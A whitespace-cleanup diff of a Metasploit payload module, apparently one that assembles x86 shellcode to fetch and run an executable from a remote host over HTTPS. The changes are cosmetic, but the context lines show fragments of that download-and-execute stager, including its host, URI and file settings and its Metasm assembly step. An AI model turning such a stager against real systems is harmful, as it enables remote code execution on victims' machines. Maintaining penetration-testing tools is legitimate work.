@@ -50,9 +50,9 @@ module Metasploit3
 	#
 	def generate
 
-		port_nr		= datastore['PORT'] || 443	
+		port_nr		= datastore['PORT'] || 443
 		server_host	= datastore['RHOST']
-		server_uri	= datastore['URI'] 
+		server_uri	= datastore['URI']
 		filename	= datastore['EXE']
 
 		#create actual payload
@@ -238,7 +238,7 @@ try_it_again:
 	jmp set_security_options
 
 dbl_get_server_host:
-	 jmp get_server_host
+	jmp get_server_host
 
 get_server_uri:
 	call httpopenrequest
@@ -334,12 +334,7 @@ get_server_host:
 
 server_host:
 	db "#{server_host}", 0x00
-
-
-
 EOS
 		the_payload = Metasm::Shellcode.assemble(Metasm::Ia32.new, payload_data).encode_string
 	end
-
-
 end
